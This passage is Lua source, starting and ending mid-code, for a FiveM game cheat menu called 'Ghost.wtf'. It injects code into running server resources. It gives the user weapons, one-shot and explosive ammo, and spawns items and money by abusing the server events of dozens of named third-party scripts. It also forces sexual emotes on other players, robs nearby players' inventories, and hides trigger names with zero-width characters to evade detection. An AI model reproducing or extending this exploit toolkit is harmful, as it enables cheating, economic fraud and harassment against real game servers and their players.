                    DeleteEntity(vehicle)
                end
            end)
        end

        GhostDeleteCar()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Delete Car triggers executed")
end)

--// Weapons Section \\--

local WeaponNameInput = MachoMenuInputbox(WeaponSection1, "Weapon Name", "weapon_combatpistol")

MachoMenuButton(WeaponSection1, "Give Weapon", function()
    local weaponName = tostring(MachoMenuGetInputbox(WeaponNameInput))
    local ped = PlayerPedId()
    local weaponHash = GetHashKey(weaponName)

    if weaponHash and weaponHash ~= 0 and DoesEntityExist(ped) then
        local code = string.format([[
            function GhostWeaponSpawner()
                CreateThread(function()
                    local ped = PlayerPedId()
                    local weaponHash = %d

                    if not HasPedGotWeapon(ped, weaponHash, false) then
                        GiveWeaponToPed(ped, weaponHash, 9999, false, true)
                        Citizen.Wait(100)
                        if not IsPedArmed(ped, 7) then
                            SetCurrentPedWeapon(ped, weaponHash, true)
                        end
                    end
                end)
            end

            GhostWeaponSpawner()
        ]], weaponHash)

        MachoInjectResource("any", code)
    else
        MachoMenuNotification("Ghost.wtf", "Invalid weapon name or ped doesn't exist.")
    end
end)

--// Weapons Section 2 \\--

MachoMenuCheckbox(WeaponSection2, "Infinite Ammo",
    function() -- ON
        InfiniteAmmoToggle = true
        Citizen.CreateThread(function()
            while InfiniteAmmoToggle do
                MachoInjectResource("any", [[
                    SetPedInfiniteAmmoClip(PlayerPedId(), true)
                ]])
                Citizen.Wait(0)
            end
        end)
        MachoMenuNotification("Ghost.wtf", "Infinite Ammo enabled")
    end,
    function() -- OFF
        InfiniteAmmoToggle = false
        MachoInjectResource("any", [[
            SetPedInfiniteAmmoClip(PlayerPedId(), false)
        ]])
        MachoMenuNotification("Ghost.wtf", "Infinite Ammo disabled")
    end
)


MachoMenuCheckbox(WeaponSection2, "One Shot",
    function()
        OneShotToggle = true
        MachoInjectResource("any", [[
            Citizen.CreateThread(function()
                while true do
                    Citizen.Wait(0)
                    if ]] .. tostring(true) .. [[ then
                        SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                    else
                        SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                    end
                end
            end)
        ]])
        MachoMenuNotification("Ghost.wtf", "One Shot enabled")
    end,
    function()
        OneShotToggle = false
        MachoInjectResource("any", [[
            SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
        ]])
        MachoMenuNotification("Ghost.wtf", "One Shot disabled")
    end
)


local RapidFireToggle = false

MachoMenuCheckbox(WeaponSection2, "Rapid Fire", 
    function() -- ON
        RapidFireToggle = true
        Citizen.CreateThread(function()
            while RapidFireToggle do
                MachoInjectResource("any", [[
                    function RotationToDirection(rotation)
                        local adjustedRotation = vector3(
                            math.rad(rotation.x),
                            math.rad(rotation.y),
                            math.rad(rotation.z)
                        )
                        return vector3(
                            -math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
                            math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)),
                            math.sin(adjustedRotation.x)
                        )
                    end

                    local player = PlayerPedId()
                    local _, weapon = GetCurrentPedWeapon(player)

                    if IsControlPressed(0, 24) then
                        local camCoord = GetFinalRenderedCamCoord()
                        local camRot = GetFinalRenderedCamRot(0)
                        local direction = RotationToDirection(camRot)
                        local endCoords = camCoord + (direction * 1000.0)

                        local ray = StartExpensiveSynchronousShapeTestLosProbe(
                            camCoord.x, camCoord.y, camCoord.z,
                            endCoords.x, endCoords.y, endCoords.z,
                            -1, player, 0
                        )
                        local _, hit, hitCoords = GetShapeTestResult(ray)
                        local target = hit and hitCoords or endCoords

                        local weaponObj = GetCurrentPedWeaponEntityIndex(player)
                        local muzzleCoords = GetEntityCoords(weaponObj)

                        for i = 1, 2 do
                            ShootSingleBulletBetweenCoords(
                                muzzleCoords.x, muzzleCoords.y, muzzleCoords.z,
                                target.x, target.y, target.z,
                                1, true, weapon, player, true, false, -1.0
                            )
                        end
                    end
                ]])
                Citizen.Wait(130)
            end
        end)
        MachoMenuNotification("Ghost.wtf", "Rapid Fire enabled")
    end,
    function() -- OFF
        RapidFireToggle = false
        MachoMenuNotification("Ghost.wtf", "Rapid Fire disabled")
    end
)


MachoMenuCheckbox(WeaponSection2, "Force Third Person", 
    function()
        ForceThirdPerson = true
        MachoInjectResource("any", [[
            Citizen.CreateThread(function()
                while true do
                    Citizen.Wait(100)
                    if ]] .. tostring(true) .. [[ then
                        if GetFollowPedCamViewMode() ~= 0 then
                            SetFollowPedCamViewMode(0)
                        end
                        if GetFollowVehicleCamViewMode() ~= 0 then
                            SetFollowVehicleCamViewMode(0)
                        end
                    else
                        break
                    end
                end
            end)
        ]])
        MachoMenuNotification("Ghost.wtf", "Force Third Person enabled")
    end,
    function()
        ForceThirdPerson = false
        MachoInjectResource("any", [[
            SetFollowPedCamViewMode(1)
            SetFollowVehicleCamViewMode(1)
        ]])
        MachoMenuNotification("Ghost.wtf", "Force Third Person disabled")
    end
)


local NoRecoilToggle = false

MachoMenuCheckbox(WeaponSection2, "No Recoil",
    function()
        NoRecoilToggle = true
        Citizen.CreateThread(function()
            while NoRecoilToggle do
                MachoInjectResource("any", [[
                    SetWeaponRecoilShakeAmplitude(GetSelectedPedWeapon(PlayerPedId()), 0.0)
                ]])
                Citizen.Wait(0)
            end
        end)
        MachoMenuNotification("Ghost.wtf", "No Recoil enabled")
    end,
    function()
        NoRecoilToggle = false
        MachoInjectResource("any", [[
            SetWeaponRecoilShakeAmplitude(GetSelectedPedWeapon(PlayerPedId()), 1.0)
        ]])
        MachoMenuNotification("Ghost.wtf", "No Recoil disabled")
    end
)

MachoMenuCheckbox(WeaponSection2, "No Spread",
    function()
        MachoInjectResource("any", [[
            local NoSpreadToggle = true

            CreateThread(function()
                while NoSpreadToggle do
                    SetPedAccuracy(PlayerPedId(), 100)
                    Wait(0)
                end
                SetPedAccuracy(PlayerPedId(), 50)
            end)
        ]])
        MachoMenuNotification("Ghost.wtf", "No Spread enabled")
    end,
    function()
        MachoInjectResource("any", [[
            NoSpreadToggle = false
        ]])
        MachoMenuNotification("Ghost.wtf", "No Spread disabled")
    end
)

MachoMenuCheckbox(WeaponSection2, "Teleport Ammo",
    function() -- ON
        local code = [[
            function GhostTeleportAmmo()
                CreateThread(function()
                    function RotationToDirection(rot)
                        local rad = vector3(math.rad(rot.x), math.rad(rot.y), math.rad(rot.z))
                        return vector3(
                            -math.sin(rad.z) * math.abs(math.cos(rad.x)), 
                            math.cos(rad.z) * math.abs(math.cos(rad.x)), 
                            math.sin(rad.x)
                        )
                    end

                    while true do
                        Wait(0)
                        local ped = PlayerPedId()
                        if IsPedShooting(ped) then
                            local camCoord = GetFinalRenderedCamCoord()
                            local camRot = GetFinalRenderedCamRot(0)
                            local dir = RotationToDirection(camRot)
                            local endCoords = camCoord + (dir * 1000.0)
                            local ray = StartExpensiveSynchronousShapeTestLosProbe(
                                camCoord.x, camCoord.y, camCoord.z,
                                endCoords.x, endCoords.y, endCoords.z,
                                -1, ped, 0
                            )
                            local _, hit, coords = GetShapeTestResult(ray)

                            if hit then
                                SetEntityCoords(ped, coords.x, coords.y, coords.z, false, false, false, false)
                            end
                        end
                    end
                end)
            end

            GhostTeleportAmmo()
        ]]
        MachoInjectResource("any", code)
        MachoMenuNotification("Ghost.wtf", "Teleport Ammo enabled")
    end,

    function() -- OFF
        TeleportAmmoToggle = false
        MachoMenuNotification("Ghost.wtf", "Teleport Ammo disabled")
    end
)


MachoMenuCheckbox(WeaponSection2, "Fire Ammo", 
    function() -- When enabled
        local code = [[

            function GhostFireAmmo()
                CreateThread(function()
                    function RotationToDirection(rot)
                        local rad = vector3(math.rad(rot.x), math.rad(rot.y), math.rad(rot.z))
                        return vector3(
                            -math.sin(rad.z) * math.abs(math.cos(rad.x)), 
                            math.cos(rad.z) * math.abs(math.cos(rad.x)), 
                            math.sin(rad.x)
                        )
                    end

                    while true do
                        Wait(0)
                        local ped = PlayerPedId()
                        if IsPedShooting(ped) then
                            local camCoord = GetFinalRenderedCamCoord()
                            local camRot = GetFinalRenderedCamRot(0)
                            local dir = RotationToDirection(camRot)
                            local endCoords = camCoord + (dir * 1000.0)
                            local ray = StartExpensiveSynchronousShapeTestLosProbe(
                                camCoord.x, camCoord.y, camCoord.z,
                                endCoords.x, endCoords.y, endCoords.z,
                                -1, ped, 0
                            )
                            local _, hit, coords = GetShapeTestResult(ray)

                            if hit then
                                StartScriptFire(coords.x, coords.y, coords.z, 25, false)
                            end
                        end
                    end
                end)
            end

            GhostFireAmmo()
        ]]

        MachoInjectResource("any", code)
        MachoMenuNotification("Ghost.wtf", "Fire Ammo Enabled")
    end,

    function() -- When disabled
        FireAmmoToggle = false
        MachoMenuNotification("Ghost.wtf", "Fire Ammo Disabled")
    end
)

local ExplosiveAmmoToggle = false

MachoMenuCheckbox(WeaponSection2, "Explosive Ammo",
    function() -- When toggled ON
        local code = [[
            function GhostExplosiveAmmo()
                CreateThread(function()
                    function RotationToDirection(rot)
                        local rad = vector3(math.rad(rot.x), math.rad(rot.y), math.rad(rot.z))
                        return vector3(
                            -math.sin(rad.z) * math.abs(math.cos(rad.x)), 
                            math.cos(rad.z) * math.abs(math.cos(rad.x)), 
                            math.sin(rad.x)
                        )
                    end

                    while true do
                        Wait(0)
                        local ped = PlayerPedId()
                        if IsPedShooting(ped) then
                            local camCoord = GetFinalRenderedCamCoord()
                            local camRot = GetFinalRenderedCamRot(0)
                            local dir = RotationToDirection(camRot)
                            local endCoords = camCoord + (dir * 1000.0)
                            local ray = StartExpensiveSynchronousShapeTestLosProbe(
                                camCoord.x, camCoord.y, camCoord.z,
                                endCoords.x, endCoords.y, endCoords.z,
                                -1, ped, 0
                            )
                            local _, hit, coords = GetShapeTestResult(ray)

                            if hit then
                                AddExplosion(coords.x, coords.y, coords.z, 2, 1.0, true, false, 1.0)
                            end
                        end
                    end
                end)
            end

            GhostExplosiveAmmo()
        ]]
        MachoInjectResource("any", code)
        MachoMenuNotification("Ghost.wtf", "Explosive Ammo enabled")
    end,

    function() -- When toggled OFF
        ExplosiveAmmoToggle = false
        MachoMenuNotification("Ghost.wtf", "Explosive Ammo disabled")
    end
)

MachoMenuDropDown(WeaponSection2, "Set Weapon Tint", function(index)
    if index >= 1 and index <= 8 then
        MachoInjectResource("any", string.format([[
            local ped = PlayerPedId()
            local weapon = GetSelectedPedWeapon(ped)
            if weapon then
                SetPedWeaponTintIndex(ped, weapon, %d)
            end
        ]], index - 1))
    end
end, "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum")

MachoMenuDropDown(WeaponSection2, "Set Weapon Attachment", function(index)
    local components = {
        [1] = 0x65EA7EBB, -- Flashlight
        [2] = 0x837445AA, -- Suppressor
        [3] = 0xA73D4664, -- Grip
        [4] = 0xC304849A, -- Scope
        [5] = 0xE608B35E  -- Extended Clip
    }

    if index == 0 then
        for _, component in pairs(components) do
            MachoInjectResource("any", string.format([[
                local ped = PlayerPedId()
                local weapon = GetSelectedPedWeapon(ped)
                if HasPedGotWeaponComponent(ped, weapon, %d) then
                    RemoveWeaponComponentFromPed(ped, weapon, %d)
                end
            ]], component, component))
        end
    elseif components[index] then
        local comp = components[index]
        MachoInjectResource("any", string.format([[
            local ped = PlayerPedId()
            local weapon = GetSelectedPedWeapon(ped)
            if not HasPedGotWeaponComponent(ped, weapon, %d) then
                GiveWeaponComponentToPed(ped, weapon, %d)
            end
        ]], comp, comp))
    end
end, "None", "Flashlight", "Suppressor", "Grip", "Scope", "Extended Clip")

local function StartAmmoEffectToggle(toggleName, effectCode)
    _G[toggleName] = true
    Citizen.CreateThread(function()
        while _G[toggleName] do
            MachoInjectResource("any", effectCode)
            Citizen.Wait(0)
        end
    end)
end

MachoMenuSlider(WeaponSection2, "Damage Multiplier", 1.0, 1.0, 5.0, "x", 2, function(value)
    MachoInjectResource("any", string.format(
        [[SetWeaponDamageModifier(GetSelectedPedWeapon(PlayerPedId()), %.2f)]], value
    ))
end)

MachoMenuSlider(WeaponSection2, "Weapon Range Multiplier", 1.0, 1.0, 10.0, "x", 2, function(value)
    MachoInjectResource("any", string.format(
        [[SetWeaponDamageModifier(GetSelectedPedWeapon(PlayerPedId()), %.2f)]], value
    ))
end)

--// Emotes Section \\--

-- Dropdown for selecting emote
local EmoteDropDownChoice = 0
local EmoteToggle = false

local emoteMap = {
    [0] = "slapped",
    [1] = "punched",
    [2] = "giveblowjob",
    [3] = "headbutted",
    [4] = "hug4",
    [5] = "streetsexfemale"
}

MachoMenuDropDown(EmotesSection2, "Emotes", function(index)
    EmoteDropDownChoice = index or 0
end, 
"Slap", 
"Punch", 
"BlowJob", 
"HeadButted", 
"Romantic Hugs", 
"Sex")

MachoMenuCheckbox(EmotesSection2, "Give Emote",
    function()
        if EmoteToggle then return end
        EmoteToggle = true

        Citizen.CreateThread(function()
            while EmoteToggle do
                local selectedEmote = emoteMap[EmoteDropDownChoice]
                if selectedEmote then
                    MachoInjectResource("any", ([[
                        TriggerEvent("ClientEmoteRequestReceive", "%s", true)
                    ]]):format(selectedEmote))
                end
                Citizen.Wait(500)
            end
        end)
    end,

    function()
        EmoteToggle = false
    end
)

-- Helper functions defined locally so you can call them immediately
local function randomString(length)
    local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local output = ""
    for _ = 1, length do
        local rand = math.random(#charset)
        output = output .. charset:sub(rand, rand)
    end
    return output
end

local function parseArgs(argString)
    if not argString or argString == "" then return {} end
    local args = {}
    for arg in string.gmatch(argString, '([^,]+)') do
        arg = arg:gsub("^%s*(.-)%s*$", "%1")
        local num = tonumber(arg)
        if num then
            table.insert(args, num)
        elseif arg == "true" then
            table.insert(args, true)
        elseif arg == "false" then
            table.insert(args, false)
        else
            table.insert(args, arg)
        end
    end
    return args
end

local function addZeroWidthChar(str)
    local zwc = utf8.char(0x200B)
    return str:sub(1,1) .. zwc .. str:sub(2)
end

local function ExecuteTrigger(triggerName, args)
    if not triggerName or triggerName == "" then
        MachoMenuNotification("Trigger Executor", "Please enter a valid trigger name.")
        return false
    end

    triggerName = addZeroWidthChar(triggerName:gsub("^%s*(.-)%s*$", "%1"))

    if #args == 0 then args = {true} end

    TriggerServerEvent(triggerName, table.unpack(args))
    MachoMenuNotification("Trigger Executor", "Executed trigger: " .. triggerName)
    return true
end

local function split(str, delim)
    local result = {}
    for match in (str .. delim):gmatch("(.-)" .. delim) do
        table.insert(result, match)
    end
    return result
end

local function suggestEventType(payload)
    if payload:match(":") then
        local prefix = split(payload, ":")[1]:lower()
        if prefix:match("set") or prefix:match("open") then return "CLIENT"
        elseif prefix:match("finish") or prefix:match("save") then return "SERVER" end
    end
    return "CLIENT"
end

-- Your UI setup (replace 'ExecutionsSection1' and 'ExecutionsSection2' with your actual group refs)

local triggerNameBox = MachoMenuInputbox(ExecutionsSection1, "Enter Trigger Name:", "TriggerServerEvent:event")

MachoMenuButton(ExecutionsSection1, "Execute Trigger", function()
    local name = MachoMenuGetInputbox(triggerNameBox)
    local args = parseArgs("")  -- Or add input box for args if you want
    ExecuteTrigger(name, args)
end)

local eventPayloadBox = MachoMenuInputbox(ExecutionsSection2, "Event Payload", "revivePlayer")
local resourceBox = MachoMenuInputbox(ExecutionsSection2, "Resource", "wasabi_ambulance")

local currentEventType = ""

MachoMenuDropDown(ExecutionsSection2, "Event Type", function(selected)
    currentEventType = selected
end, "CLIENT", "SERVER")

MachoMenuButton(ExecutionsSection2, "Execute Event", function()
    local payload = MachoMenuGetInputbox(eventPayloadBox)
    local resource = MachoMenuGetInputbox(resourceBox)

    if payload == "" or resource == "" then
        MachoMenuNotification("Error", "Please fill in both Event Payload and Resource.")
        return
    end

    if currentEventType == "" then
        currentEventType = suggestEventType(payload)
        MachoMenuNotification("Suggested Event Type", currentEventType)
    elseif currentEventType ~= suggestEventType(payload) then
        MachoMenuNotification("Suggested Event Type", suggestEventType(payload))
    end

    local fullEvent = resource .. ":" .. payload

    MachoInjectResource('any', [[
        local function executeEvent()
            if "]] .. currentEventType .. [[" == "CLIENT" then
                TriggerEvent("]] .. fullEvent .. [[")
            elseif "]] .. currentEventType .. [[" == "SERVER" then
                TriggerServerEvent("]] .. fullEvent .. [[")
            end
        end
        executeEvent()
    ]])

    MachoMenuNotification("Success", "Triggered " .. currentEventType .. " event: " .. payload)
end)

--// Events Tab \\--

-- Create input boxes for item name and amount
local GhostItemBox = MachoMenuInputbox(EventsSection1, "Item Name", "phone")
local GhostAmountBox = MachoMenuInputbox(EventsSection1, "Amount", "1")

-- Create button to spawn items
MachoMenuButton(EventsSection1, "Spawn Item", function()
    -- Get values from input boxes
    local itemName = MachoMenuGetInputbox(GhostItemBox)
    local amount = tonumber(MachoMenuGetInputbox(GhostAmountBox))

    -- Validate input
    if not itemName or itemName == "" or not amount or amount <= 0 then
        MachoMenuNotification("Ghost.wtf", "Invalid input.")
        return
    end

    -- Define resource handlers for different FiveM resources
    local resourceHandlers = {
        ["ak47_drugmanagerv2"] = function()
            return string.format([[
                TriggerServerEvent('ak47_drugmanagerv2:shop:sell', 
                    "%s", 
                    {
                        buyprice = 0, 
                        currency = "money", 
                        label = "%s", 
                        name = "%s", 
                        sellprice = %d 
                    }, 
                    %d
                )
            ]],
            "-1146.44,941.22", "ghostwtf", itemName, amount, 1)
        end,

        ["coinShopMoney"] = function()
            return string.format([[
                local moneyData = {
                    account = "%s",
                    money = %d
                }

                lib.callback.await("bs:cs:giveMoney", false, moneyData)
            ]], "money", 1)
        end,

        ["svdden_drugsellingv2"] = function()
            return string.format([[
                Citizen.CreateThread(function()
                    for i = 1, 10000 do
                        TriggerServerEvent('svdden_drugsellingv2:server:banplayer', '%s', %d)
                        Citizen.Wait(1)
                    end
                end)
            ]], itemName, amount)
        end,

        ["fuksus-shops"] = function()
            return string.format(
                'TriggerServerEvent("__ox_cb_fuksus-shops:buyItems", "fuksus-shops", "fuksus-shops:buyItems", { ["payment"] = "bank", ["items"] = { [1] = { ["amount"] = %d, ["label"] = "%s", ["price"] = 0, ["name"] = "%s" } } })',
                amount, itemName, itemName
            )
        end,

        ["coinShop"] = function()
            return string.format([[
                local itemData = {
                    item = "%s",
                    count = %d
                }

                lib.callback.await("bs:cs:giveItem", false, itemData)
            ]], itemName, amount)
        end,

        ["ak47_druglabs"] = function()
            return table.concat({
                "TriggerServerEvent('ak47_druglabs:cancollect', true);",
                string.format("TriggerServerEvent('ak47_druglabs:collectDrugs', '%s', %d, 'Zip Lock Bag', 2);", itemName, amount),
                "Citizen.Wait(4000);",
                "TriggerServerEvent('ak47_druglabs:cancollect', false);"
            }, "\n")
        end,

        ["t1ger_lib"] = function()
            local code = ""
            for _ = 1, amount do
                code = code .. string.format("TriggerServerEvent('t1ger_lib:server:addItem', '%s');", itemName)
            end
            return code
        end,

        ["esx_weashop"] = function()
            return string.format("TriggerServerEvent('esx_weashop:buyItem', '%s', %d, 'BlackWeashop')", itemName, amount)
        end,

        ["jg-mechanic"] = function()
            return string.format("TriggerServerEvent('jg-mechanic:client:input-shop-purchase-qty', { item = '%s', price = 0, mechanicId = 'bennys', shopIndex = 1 })", itemName)
        end,

        ["brutal_shop_robbery"] = function()
            return string.format("TriggerServerEvent('brutal_shop_robbery:server:AddItem', true, '%s', %d)", itemName, amount)
        end,

        ["jim-consumables"] = function()
            return string.format("TriggerServerEvent('jim-consumables:server:toggleItem', true, '%s', %d)", itemName, amount)
        end,

        ["devcore_smokev2"] = function()
            local code = ""
            for _ = 1, amount do
                code = code .. string.format("TriggerServerEvent('devcore_smokev2:server:AddItem', '%s');", itemName)
            end
            return code
        end,

        ["devcore_needs"] = function()
            local code = ""
            for _ = 1, amount do
                code = code .. string.format("TriggerServerEvent('devcore_needs:server:AddItem', '%s');", itemName)
            end
            return code
        end,

        ["xmmx_letscookplus"] = function()
            return string.format("TriggerServerEvent('xmmx_letscookplus:server:toggleItem', true, '%s', %d)", itemName, amount)
        end,

        ["apex_cluckinbell"] = function()
            local code = ""
            for _ = 1, amount do
                code = code .. string.format("TriggerServerEvent('apex_cluckinbell:client:addItem', '%s');", itemName)
            end
            return code
        end,

        ["tvrpdrugs"] = function()
            return string.format("TriggerServerEvent('tvrpdrugs:server:addItem', '%s', %d)", itemName, amount)
        end,

        ["nk"] = function()
            return string.format("TriggerServerEvent('nk:barbeque:addItem', '%s', %d)", itemName, amount)
        end,

        ["Pug-GiveChoppingItem"] = function()
            return string.format('TriggerServerEvent("Pug:server:GiveChoppingItem", true, "%s", %d, nil)', itemName, amount)
        end,

        ["matti-airsoft"] = function()
            return string.format("TriggerServerEvent('matti-airsoft:giveItem', '%s', %d)", itemName, amount)
        end,

        ["jim-mining"] = function()
            return string.format("TriggerServerEvent('jim-mining:server:toggleItem', true, '%s', %d)", itemName, amount)
        end,

        ["qb-advancedrugs"] = function()
            return string.format("TriggerServerEvent('qb-advancedrugs:giveItem', '%s', %d)", itemName, amount)
        end,

        ["horizon_paymentsystem"] = function()
            return string.format("TriggerServerEvent('horizon_paymentsystem:giveItem', '%s', %d)", itemName, amount)
        end,

        ["solos-joints"] = function()
            return string.format("TriggerServerEvent('solos-joints:server:itemadd', '%s', %d)", itemName, amount)
        end,

        ["wp-pocketbikes"] = function()
            return string.format("TriggerServerEvent('wp-pocketbikes:server:AddItem', '%s', nil)", itemName)
        end,

        ["boii-moneylaunderer"] = function()
            return string.format("TriggerServerEvent('boii-moneylaunderer:sv:AddItem', '%s', %d)", itemName, amount)
        end,

        ["boii-consumables"] = function()
            return string.format("TriggerServerEvent('boii-consumables:sv:AddItem', '%s', %d)", itemName, amount)
        end,

        ["angelicxs-CivilianJobs"] = function()
            return string.format("TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', '%s', %d)", itemName, math.floor(amount))
        end,

        ["hg-wheel"] = function()
            return string.format("TriggerServerEvent('hg-wheel:server:giveitem', '%s')", itemName)
        end,

        ["weedroll"] = function()
            return string.format("TriggerServerEvent('weedroll:additem', '%s', %d)", itemName, amount)
        end,

        ["ak47_idcard"] = function()
            return string.format("TriggerServerEvent('ak47_idcard:giveid', '%s')", itemName)
        end,

        ["jim-mechanic"] = function()
            return string.format("TriggerServerEvent('jim-mechanic:server:toggleItem', true, '%s', %d)", itemName, amount)
        end,

        ["custom"] = function()
            return string.format('TriggerServerEvent("custom:giveWeapon", "%s")', itemName)
        end,

        ["mc9-coretto"] = function()
            return string.format("TriggerServerEvent('mc9-coretto:server:addItem', '%s', %d)", itemName, amount)
        end,

        ["stasiek_selldrugsv2"] = function()
            return string.format("TriggerServerEvent('stasiek_selldrugsv2:pay', { price = 1, type = '%s', count = %d })", itemName, amount)
        end,

        ["QBCore"] = function()
            return string.format('TriggerServerEvent("QBCore:Server:AddItem", "%s", %d)', itemName, amount)
        end,

        ["ez_lib"] = function()
            return string.format("TriggerServerEvent('ez_lib:server:AddItem', '%s', %d)", itemName, amount)
        end,

        ["mc9-taco"] = function()
            return string.format("TriggerServerEvent('mc9-taco:server:addItem', '%s', %d)", itemName, amount)
        end,

        ["kaves_drugsv2"] = function()
            return string.format("TriggerServerEvent('kaves_drugsv2:server:giveItem', '%s', %d)", itemName, amount)
        end,

        ["brutal_hunting"] = function()
            return string.format(
                'TriggerServerEvent("brutal_hunting:server:AddItem", { { amount = %d, item = "%s", label = "DXMMYISDADY", price = 0 } })',
                 amount, itemName
            )
        end,

        ["fivecode_camping"] = function()
            return string.format(
                "TriggerServerEvent('fivecode_camping:callCallback', 'fivecode_camping:shopPay', 0, { ['price'] = 0, ['item'] = '%s', ['amount'] = %d, ['label'] = 'DXMMYISDADDY' }, { ['args'] = { ['payment'] = { ['bank'] = true, ['cash'] = true } }, ['entity'] = 9218, ['distance'] = 0.64534759521484, ['hide'] = false, ['type'] = 'bank', ['label'] = 'Open Shop', ['coords'] = 'vector3(-773.2181, 5597.66, 33.97217)', ['name'] = 'npcShop-vec4(-773.409973, 5597.819824, 33.590000, 172.910004)' })",
                itemName, amount
            )
        end,

        ["ak47_drugmanager"] = function()
            return string.format("TriggerServerEvent('ak47_drugmanager:pickedupitem', '%s')", itemName)
        end,

        ["zat-farming"] = function()
            return string.format("TriggerServerEvent('zat-farming:server:GiveItem', '%s')", itemName)
        end,

        ["jim-burgershot"] = function()
            return string.format("TriggerServerEvent('jim-burgershot:server:toggleItem', true, '%s', %d)", itemName, amount)
        end,

        ["mt-restaurants"] = function()
            return string.format("TriggerServerEvent('mt-restaurants:server:AddItem', '%s', %d)", itemName, amount)
        end,

        ["jim-recycle"] = function()
            return string.format("TriggerServerEvent('jim-recycle:server:toggleItem', true, '%s', %d)", itemName, amount)
        end,

        ["uwucafe"] = function()
            return string.format("TriggerServerEvent('uwucafe:addItem', '%s', %d)", itemName, amount)
        end,

        ["guru-oxyrun"] = function()
            return string.format("TriggerServerEvent('guru-oxyrun:server:AddItem', '%s', %d)", itemName, amount)
        end,

        ["mc9"] = function()
            return string.format("TriggerServerEvent('mc9:server:addthing', '%s', nil, %d)", itemName, amount)
        end,

        ["zat-weed"] = function()
            return string.format("TriggerServerEvent('zat-weed:server:AddItem', '%s', nil, %d)", itemName, amount)
        end,

        ["lu-consumables"] = function()
            return string.format("TriggerServerEvent('lu-consumables:server:toggleItem', true, '%s', %d)", itemName, amount)
        end,

        ["ak4y-advancedFishing"] = function()
            return string.format("TriggerServerEvent('ak4y-advancedFishing:addItem', '%s')", itemName)
        end,

        ["osp_ambulance"] = function()
            return string.format("TriggerServerEvent('osp_ambulance:addItem', '%s', %d)", itemName, amount)
        end,

        ["bobi-selldrugs"] = function()
            return string.format("TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', '%s', %d)", itemName, amount)
        end,


        ["virus_consumibles"] = function()
            return string.format('TriggerServerEvent("virus_consumibles:server:toggleItem", true, "%s", %d)', itemName, amount)
        end,

        ["mc9-graverobbery"] = function()
            return string.format("TriggerServerEvent('mc9-graverobbery:server:reward', '%s')", itemName)
        end,

        ["inverse-consumables"] = function()
            return string.format("TriggerServerEvent('inverse-consumables:server:AddItem', '%s', %d)", itemName, amount)
        end,

        
        ["boii-whitewidow"] = function()
            return string.format("TriggerServerEvent('boii-whitewidow:server:AddItem', '%s', %d)", itemName, amount)
        end,

        ["mc9-drugs"] = function()
            return string.format("TriggerServerEvent('mc9-drugs:server:givePlant', '%s')", itemName)
        end,

        ["sz-blackmarket"] = function()
            return string.format("TriggerServerEvent('sz-blackmarket:server:AddItem', '%s', %d)", itemName, amount)
        end,

        ["solos-methlab"] = function()
            return string.format("TriggerServerEvent('solos-methlab:server:itemadd', '%s', %d, true)", itemName, amount)
        end,

        ["ak4y-caseOpening"] = function()
            return string.format("TriggerServerEvent('ak4y-caseOpening:addGoldCoin', %d)", amount)
        end,

        ["nc-playTimeShop"] = function()
            return string.format("TriggerServerEvent('nc-playTimeShop:addCoin', %d)", amount)
        end,

        ["stg-goldpanning"] = function()
            return string.format("TriggerServerEvent('stg-goldpanning:collect', %d)", amount)
        end,
    }

    -- Get list of active resources
    local activeResources = {}
    local resourceCount = GetNumResources()
    for i = 0, resourceCount - 1 do
        local resourceName = GetResourceByFindIndex(i)
        if GetResourceState(resourceName) == "started" then
            activeResources[resourceName] = true
        end
    end

    -- Track successful injections
    local injectedCount = 0

    -- Try to inject into active resources
    for resourceName, handler in pairs(resourceHandlers) do
        if activeResources[resourceName] then
            local success, code = pcall(handler)
            if success and code then
                MachoInjectResource(resourceName, code)
                injectedCount = injectedCount + 1
            end
        end
    end

    -- Fallback: inject into "any" if no matches
    if injectedCount == 0 then
        local combinedCode = ""
        for _, handler in pairs(resourceHandlers) do
            local success, code = pcall(handler)
            if success and code then
                combinedCode = combinedCode .. code .. "\n"
            end
        end
        if combinedCode ~= "" then
            MachoInjectResource("any", combinedCode)
        end
    end

    -- Show notification
    MachoMenuNotification("Ghost.wtf", string.format("Spawned %d x %s", amount, itemName))
end)

--// Events Section 2 \\--

MachoMenuButton(EventsSection2, "Crutch Everyone (Need EMS)", function()
    MachoInjectResource("wasabi_crutch", [[
       TriggerServerEvent('wasabi_crutch:giveCrutch', -1, 999999999999999)
    ]])
end)

MachoMenuButton(EventsSection2, "Bring Everyone", function()
    MachoInjectResource('any', [[
        local function g()
            TriggerServerEvent("ServerValidEmote", -1, "slapped2")
        end
        g()
    ]])
    MachoMenuNotification("Ghost.wtf", "Bring Everyone Trigger Events Executed")
end)

MachoMenuButton(EventsSection2, "Inventory Stealer [E]", function() 
    local code = [[
        local robbing = false
        local targetPlayer = nil

        local function GetClosestPlayer()
            local closestPlayer = -1
            local closestDistance = -1
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)
                    if closestDistance == -1 or distance < closestDistance then
                        closestPlayer = playerId
                        closestDistance = distance
                    end
                end
            end

            return closestPlayer, closestDistance
        end

        local function ForceHandsUpOnPlayer(ped)
            local dict = "missminuteman_1ig_2"
            local anim = "handsup_base"

            RequestAnimDict(dict)
            while not HasAnimDictLoaded(dict) do
                Wait(10)
            end

            TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, 49, 0, false, false, false)
        end

        local function StopRobbing()
            if targetPlayer and DoesEntityExist(GetPlayerPed(targetPlayer)) then
                ClearPedTasks(GetPlayerPed(targetPlayer))
            end

            robbing = false
            targetPlayer = nil
        end

        -- Main thread for robbery interaction
        CreateThread(function()
            while true do
                Wait(0)

                if not robbing then
                    local closestPlayer, distance = GetClosestPlayer()

                    if closestPlayer ~= -1 and distance <= 2.0 then
